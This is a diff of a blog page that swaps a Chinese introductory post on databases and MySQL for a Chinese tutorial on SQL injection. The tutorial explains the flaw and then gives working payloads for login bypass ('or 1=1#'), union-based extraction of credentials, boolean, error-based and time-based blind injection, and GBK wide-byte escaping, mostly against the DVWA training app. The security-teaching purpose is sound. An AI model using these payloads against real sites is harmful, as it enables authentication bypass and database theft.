@@ -130,7 +130,7 @@
   
   <article class="article post card animate" itemscope="" itemtype="http://schema.org/Article">
     <div class="post-block">
-      <link itemprop="mainEntityOfPage" href="https://TuringGu.github.io/2019/12/15/DB-SQL/">
+      <link itemprop="mainEntityOfPage" href="https://TuringGu.github.io/2019/01/01/SQL-injection/">
       <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
         <meta itemprop="name" content="TuringGu">
         <meta itemprop="description" content="">
@@ -142,12 +142,12 @@
     </div>
     <header class="post-header">
       <h1 class="post-title" itemprop="name headline">
-        <a class="post-title-link post-title-link-external" href="/2019/12/15/DB-SQL/" itemprop="url">数据库和SQL</a>
+        <a class="post-title-link post-title-link-external" href="/2019/01/01/SQL-injection/" itemprop="url">SQL注入</a>
       </h1>
       <div class="post-meta">
         
         <span class="post-date">
-          <i class="far fa-calendar-plus"></i><span><time title="post-date" itemprop="dateCreated datePublished" datetime="2019-12-15T12:39:57+08:00">2019-12-15 12:39:57</time></span>
+          <i class="far fa-calendar-plus"></i><span><time title="post-date" itemprop="dateCreated datePublished" datetime="2019-01-01T13:22:45+08:00">2019-01-01 13:22:45</time></span>
         </span>
         
         
@@ -156,42 +156,191 @@
     </header>
     <main class="post-main" itemprop="articleBody">
       
-      <h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><h3 id="定义与概念"><a href="#定义与概念" class="headerlink" title="定义与概念"></a>定义与概念</h3><p>数据库是为了解决数据集中管理上的缺陷而开发出来的数据存储、取用、新增、删除的管理软件，其本质也是对文件进行操作。它的出现使得开发者无需关心它本身如何实现数据管理，只需关注数据本身即可，极大缩短了开发周期。</p>
-<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>数据库分为很多类型与发行版本，常分为：</p>
-<ul>
-<li>层次式</li>
-<li>网络式</li>
-<li>关系型</li>
-</ul>
-<p>而不同的数据库是按不同的数据结构来联系和组织的，在当今互联网中，最常见的数据库模型主要分两种：</p>
-<ul>
-<li>关系型</li>
-<li>非关系型</li>
+      <h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="定义与概念"><a href="#定义与概念" class="headerlink" title="定义与概念"></a>定义与概念</h3><blockquote>
+<p>所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。</p>
+</blockquote>
+<hr>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ul>
+<li>过滤不严格</li>
+<li>恶意用户构造的参数被执行<blockquote>
+<p>当Web应用向后台数据库传递SQL语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。</p>
+</blockquote>
+</li>
 </ul>
 <hr>
-<h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><h4 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h4><ol>
-<li>数据以表格的形式出现</li>
-<li>每行为各种记录名称</li>
-<li>每列为记录名称所对应的数据域</li>
-<li>许多的行和列组成一张表单</li>
-<li>若干的表单组成database</li>
+<h3 id="本质"><a href="#本质" class="headerlink" title="本质"></a>本质</h3><blockquote>
+<p>把用户输入的数据当作代码来执行，违背了<strong>数据与代码分离</strong>原则</p>
+</blockquote>
+<h3 id="关键条件"><a href="#关键条件" class="headerlink" title="关键条件"></a>关键条件</h3><ul>
+<li>用户能控制输入的内容</li>
+<li>Web应用把用户输入的内容带入到数据库中执行</li>
+</ul>
+<hr>
+<h3 id="万能密码原理"><a href="#万能密码原理" class="headerlink" title="万能密码原理"></a>万能密码原理</h3><p>后台登陆语句为：<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">admin</span> <span class="hljs-keyword">WHERE</span> Username = <span class="hljs-string">'user'</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">Password</span> = <span class="hljs-string">'pass'</span><br></code></pre></td></tr></table></figure></p>
+<p>由于只要结果不为空就返回真，也就是登陆成功。<br>因此，输入万能密码<code>or 1=1#</code><br>构造后的语句拼接为：<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">admin</span> <span class="hljs-keyword">WHERE</span> Username = <span class="hljs-string">'user'</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment"># and Password = 'pass'</span><br></code></pre></td></tr></table></figure></p>
+<p>通过注释符<code>#</code>注释后面的语句，在<code>or 1=1</code>的基础结果为真恒成立</p>
+<hr>
+<h3 id="注入分类"><a href="#注入分类" class="headerlink" title="注入分类"></a>注入分类</h3><ol>
+<li>根据请求方式不同可分为：</li>
+</ol>
+<ul>
+<li><code>GET</code>方式请求注入</li>
+<li><code>POST</code>方式请求注入<blockquote>
+<p>差别：是否需要抓包</p>
+</blockquote>
+</li>
+</ul>
+<ol start="2">
+<li>根据SQL注入点的参数类型可分为：</li>
+</ol>
+<ul>
+<li>整数型注入（int型）</li>
+<li>字符型注入（char型）</li>
+</ul>
+<ol start="3">
+<li>根据反馈类型可分为以下常见几种：</li>
+</ol>
+<ul>
+<li>基于显错</li>
+<li>union类型</li>
+<li>布尔类型</li>
+<li>基于时间</li>
+</ul>
+<ol start="4">
+<li>根据是否回显：</li>
+</ol>
+<ul>
+<li>显注：有回显，有报错，通常使用union联合查询</li>
+<li>盲注：无回显或只有显示正常页面和不显示页面两种区别，内置结果要么输出，要么不输出，不会输出其他内容<blockquote>
+<p>盲注分为：</p>
+<ul>
+<li>布尔型<code>bool</code></li>
+<li>报错型<code>error</code></li>
+<li>时间型<code>time</code></li>
+</ul>
+</blockquote>
+</li>
+</ul>
+<hr>
+<h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><p><code>concat()</code><br>用于将多个字符串连接成一个字符串<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">CONCAT</span>(<span class="hljs-string">'My'</span>,<span class="hljs-string">'S'</span>,<span class="hljs-string">'QL'</span>)<br></code></pre></td></tr></table></figure></p>
+<p><code>group_concat()</code><br>将<code>group by</code>产生的同一个分组中的值连接起来，返回一个字符串结果<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc ] [separator '分隔符'] )<br></code></pre></td></tr></table></figure></p>
+<p><code>concat_ws()</code><br>第一个参数为分隔符，将从第二个开始的字符拼接起来，并用第一个参数分隔符隔开：<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">concat_ws(separator, str1, str2,...)<br></code></pre></td></tr></table></figure></p>
+<hr>
+<h3 id="注入基本流程"><a href="#注入基本流程" class="headerlink" title="注入基本流程"></a>注入基本流程</h3><ol>
+<li><p>判断是否有注入</p>
+</li>
+<li><p>获取数据库信息</p>
+<blockquote>
+<p>获取数据库基本信息<br>获取数据库名<br>获取表名<br>获取列名<br>获取用户数据</p>
+</blockquote>
+</li>
+<li><p>破解数据</p>
+</li>
+<li><p>提升权限</p>
+</li>
+<li><p>内网渗透</p>
+</li>
 </ol>
 <hr>
-<h4 id="常用关键词"><a href="#常用关键词" class="headerlink" title="常用关键词"></a>常用关键词</h4><p><strong>数据库</strong>：一些关联表的集合<br><strong>数据表</strong>：表是数据的矩阵。在一个数据库中的表看起来像是一个简单的电子表格<br><strong>列</strong>：一列（数据元素）包含了相同的数据<br><strong>行</strong>：一行（=元组，或记录）是一组相关的数据<br><strong>主键</strong>：具有唯一性。一个数据包只能包含一个主键。可使用主键来查询数据<br><strong>索引</strong>：使用索引可快速访问数据库表中的特定信息。索引是对数据库表中一列或多列的值进行排序的一种结构。类似于书籍的目录</p>
-<hr>
-<h4 id="MySQL安装登陆"><a href="#MySQL安装登陆" class="headerlink" title="MySQL安装登陆"></a>MySQL安装登陆</h4><p>安装：</p>
+<h2 id="注入操作"><a href="#注入操作" class="headerlink" title="注入操作"></a>注入操作</h2><h3 id="Union注入"><a href="#Union注入" class="headerlink" title="Union注入"></a>Union注入</h3><ol>
+<li>判断是否存在注入<figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">and 1=1<br>and 1=2<br></code></pre></td></tr></table></figure>
+</li>
+</ol>
 <blockquote>
-<p>通过<code>apt-get</code>安装在ubuntu系统中<br>通过<code>yum</code>安装在centos系统中<br>通过<code>phpstudy</code>运行在windows中（或mysql官网的独立安装包）</p>
+<p>都有或都没输出，说明此处不存在注入</p>
 </blockquote>
-<p>登陆：</p>
+<ol start="2">
+<li><p>判断有多少列<br>使用二分法</p>
+<figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">order by n<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>判断数据显示点</p>
+<figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,N<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>查看数据库、用户基本信息</p>
+<figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-keyword">version</span>(),<span class="hljs-keyword">database</span>()<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>查询有哪些数据库，获取数据库名</p>
+<figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">union <span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(schema_name),<span class="hljs-number">1</span> <span class="hljs-keyword">from</span> information_schema.schemata<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>查询想要的数据中有哪些表，获取数据库中表名</p>
+<figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">union <span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(table_name),<span class="hljs-number">1</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">'dvwa'</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>查询想要的数据中有哪些列，获取数据库表中列名</p>
+<figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">union <span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(column_name),<span class="hljs-number">1</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">'dvwa'</span> <span class="hljs-keyword">and</span> table_name=<span class="hljs-string">'users'</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>得到想要信息：</p>
+<figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">union <span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> dvwa.users<br></code></pre></td></tr></table></figure>
+</li>
+</ol>
 <blockquote>
-<p>在Linux中通过<code>mysql -u username -p</code>方式登陆<br>在windows中可以使用命令行登陆，和linux一样。也可使用phpstudy自带图形化工具链接数据库。或使用navicat工具登陆。</p>
+<p><code>information_schema</code>库中重点关注以下三个表：<br><code>schemata  tables  columns</code></p>
+</blockquote>
+<h3 id="BOOL型盲注"><a href="#BOOL型盲注" class="headerlink" title="BOOL型盲注"></a>BOOL型盲注</h3><p><code>and or not &gt; = &lt;</code><br>返回结果非<code>true</code>即<code>false</code><br>以下均使用<code>二分法</code></p>
+<ol>
+<li><p>得到数据库名长度</p>
+<figure class="hljs highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">and (length(database()))&gt;5<br>and (length(database()))=4<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>改变n的值依次获取数据库名的十进制ASCII值</p>
+<figure class="hljs highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">and (ascii(substr(database(),n,1)))&gt;100<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>获取数据库表名（先获取表名数量，再获取表名成都）</p>
+<figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">and (<span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>())&gt;<span class="hljs-number">5</span><br><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">length</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-number">5</span><br><span class="hljs-keyword">and</span>(<span class="hljs-keyword">ascii</span>(<span class="hljs-keyword">substr</span>((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))&gt;<span class="hljs-number">100</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>获取列名（先获取列名个数，再获取列名长度，最后获取列名）</p>
+<figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">and (ascii(substr((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">'users'</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))&gt;<span class="hljs-number">100</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>获取数据</p>
+<figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">and (ascii(substr((<span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))=<span class="hljs-number">68</span><br></code></pre></td></tr></table></figure>
+</li>
+</ol>
+<hr>
+<h3 id="盲注之报错注入"><a href="#盲注之报错注入" class="headerlink" title="盲注之报错注入"></a>盲注之报错注入</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>盲注：没有明显提示<br>报错注入：使语句出错，利用语法错误实现目的<br>必要条件：源代码会输出错误内容，如<code>mysql_error()</code>，还必须运行使用xml模块</p>
+<h4 id="常用函数与用法："><a href="#常用函数与用法：" class="headerlink" title="常用函数与用法："></a>常用函数与用法：</h4><p>其他常用方法补充：<a href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html" target="_blank" rel="noopener"><strong>十种MySQL报错注入</strong></a></p>
+<hr>
+<ol>
+<li><code>floor()</code><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">and (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*),<span class="hljs-keyword">concat</span>(<span class="hljs-keyword">user</span>(),<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a)<br></code></pre></td></tr></table></figure>
+</li>
+</ol>
+<blockquote>
+<p>查询结果至少存在三条才会触发报错，详见<a href="http://www.cnblogs.com/xishaonian/p/6227405.html" target="_blank" rel="noopener">floor报错分析</a></p>
 </blockquote>
 <hr>
-<h4 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h4><p><strong>增</strong>：<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment"># 新增数据库</span><br><span class="hljs-keyword">create</span> <span class="hljs-keyword">database</span> <span class="hljs-keyword">name</span>;  <br><br><span class="hljs-comment"># 新增数据表</span><br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> table_name(<br>    column_name column_type<br>)ending=<span class="hljs-keyword">Innodb</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">charset</span>=utf8;<br><br><span class="hljs-comment"># 新增一行数据</span><br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> table_name(field1, field2,...,fieldN)<br>	<span class="hljs-keyword">values</span>(value1, value2,...,valueN);<br></code></pre></td></tr></table></figure></p>
-<p><strong>删</strong>：<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment"># 删除数据库</span><br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">database</span> dbname;<br><br><span class="hljs-comment"># 删除数据表</span><br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> tablename;<br><br><span class="hljs-comment"># 删除一行或多行数据</span><br><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> tablename <span class="hljs-keyword">where</span> columnname=?;<br></code></pre></td></tr></table></figure></p>
-<p><strong>改</strong><br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment"># 修改数据库</span><br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> tablename <span class="hljs-keyword">drop</span>/<span class="hljs-keyword">add</span>/<span class="hljs-keyword">modify</span> columnname;<br><br><span class="hljs-comment"># 修改一行或多行数据</span><br><span class="hljs-keyword">update</span> tablename <span class="hljs-keyword">set</span> filed1=<span class="hljs-keyword">new</span>-value1,<br></code></pre></td></tr></table></figure></p>
-<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h3><p>存放当前“数据库应用”中所用数据的“元数据”</p>
+<ol start="2">
+<li><code>extractvalue()</code><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">extractvalue('hello', ./test.xml);  // 报错最大长度32位<br>and (extractvalue(1,concat(0x7e,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>)))<br><span class="hljs-keyword">and</span> extractvalue(<span class="hljs-string">'hello'</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-string">'~'</span>,<span class="hljs-keyword">substr</span>((<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata),<span class="hljs-number">1</span>,<span class="hljs-number">32</span>)))  // 优化<br></code></pre></td></tr></table></figure>
+</li>
+</ol>
+<blockquote>
+<p>若路径出现一些特殊字符如<code>~</code>，触发报错，将包括特殊字符在内的后面内容报出</p>
+</blockquote>
+<hr>
+<ol start="3">
+<li><code>updatexml()</code><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">and (updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))  // 报错最大长度<span class="hljs-number">32</span>位，优化同上<br></code></pre></td></tr></table></figure>
+</li>
+</ol>
+<hr>
+<h3 id="盲注之时间注入"><a href="#盲注之时间注入" class="headerlink" title="盲注之时间注入"></a>盲注之时间注入</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>配合其它注入法，如bool注入。<br>无论是否有结果，sql语句只要执行了，就可根据页面响应时长，判断语句是否被执行</p>
+<h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p><code>sleep()</code>，<code>benchmark()</code><br>基本用法：<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,<span class="hljs-keyword">sleep</span>(<span class="hljs-number">2</span>),<span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>))<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,<span class="hljs-keyword">benchmark</span>(<span class="hljs-number">2000000</span>,<span class="hljs-keyword">md5</span>(<span class="hljs-string">'a'</span>)),<span class="hljs-keyword">benchmark</span>(<span class="hljs-number">5000000</span>,<span class="hljs-keyword">md5</span>(<span class="hljs-string">'a'</span>)))<br></code></pre></td></tr></table></figure></p>
+<p>例子：<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">and if((ascii(substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))=<span class="hljs-number">101</span>,<span class="hljs-keyword">sleep</span>(<span class="hljs-number">1</span>),<span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>))<br></code></pre></td></tr></table></figure></p>
+<hr>
+<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><h4 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4><p>在使用PHP连接MySQL时，当设置<code>set character_set_client=gbk</code>时会导致一个编码转换注入的问题，即宽字节注入。</p>
+<p><code>GBK</code>编码<br>是对<code>GB2312</code>编码的扩展。采用双字节编码方案，编码范围：<br><code>8140~FEFE</code><br><a href="http://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php" target="_blank" rel="noopener"><strong>编码表</strong></a></p>
+<p>后台使用了过滤函数，如：</p>
+<blockquote>
+<p><code>addslashes()</code> 对<code>&#39;</code>，<code>&quot;</code>，<code>\</code>和<code>NULL</code>（NULL字符）进行处理<br><code>mysql_real_escape_string()</code> 过滤<code>\x00</code>，<code>\n</code>，<code>\r</code>，<code>\</code>，<code>&#39;</code>，<code>&quot;</code>，<code>\x1a</code><br><code>mysql_escape_string()</code> php5.3已弃用，与完全一样，除了 mysql_real_escape_string() 接受的是一个连接句柄并根据当前字符集转移字符串之外。mysql_escape_string() 并不接受连接参数，也不管当前字符集设定。</p>
+</blockquote>
+<hr>
+<h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><p>当存在此漏洞时，在注入的参数里加入<code>%df%27</code>，即可把程序中过滤的<code>\</code>（即<code>%5c</code>）“吃掉”，%df%5c拼接为gbk编码的“運”<br>例如：<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">/1.php?id=1%27 and 1=1%23  <span class="hljs-comment"># 失败的注入语句</span><br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> news <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=<span class="hljs-string">'1\' and 1=1#'</span>  <span class="hljs-comment">#过滤后后台实际执行语句</span><br><br>/<span class="hljs-number">1.</span>php?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span>%df%<span class="hljs-number">27</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>%<span class="hljs-number">23</span>  <span class="hljs-comment"># 成功的注入语句</span><br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> news <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=<span class="hljs-string">'1運'</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-comment">#'  # 后台实际执行语句</span><br></code></pre></td></tr></table></figure></p>
+<hr>
+<h4 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h4><p>若是为了避免宽字节注入的产生，可限定使用<code>mysql_set_charset(GBK)</code>来指定字符集，并且使用<code>mysql_real_escape_string</code>进行转义</p>
+<hr>
+<h3 id="二次编码注入"><a href="#二次编码注入" class="headerlink" title="二次编码注入"></a>二次编码注入</h3><hr>
+<h3 id="HTTP请求头注入"><a href="#HTTP请求头注入" class="headerlink" title="HTTP请求头注入"></a>HTTP请求头注入</h3><hr>
+<h3 id="二阶注入"><a href="#二阶注入" class="headerlink" title="二阶注入"></a>二阶注入</h3><hr>
+<hr>
+<h2 id="补充内容"><a href="#补充内容" class="headerlink" title="补充内容"></a>补充内容</h2><h3 id="Web漏洞"><a href="#Web漏洞" class="headerlink" title="Web漏洞"></a>Web漏洞</h3><ul>
+<li>用户能控制输入的内容</li>
+<li>Web应用把用户输入的内容带入数据库中执行</li>
+</ul>
 
       
     </main>
@@ -199,9 +348,9 @@
       
       <div class="post-tags">
         
-        <a class="post-tag button" href="/tags/Database/" rel="tag"><i class="fas fa-tags"></i>Database</a>
-        
         <a class="post-tag button" href="/tags/SQL/" rel="tag"><i class="fas fa-tags"></i>SQL</a>
+        
+        <a class="post-tag button" href="/tags/注入/" rel="tag"><i class="fas fa-tags"></i>注入</a>
         
       </div>
       
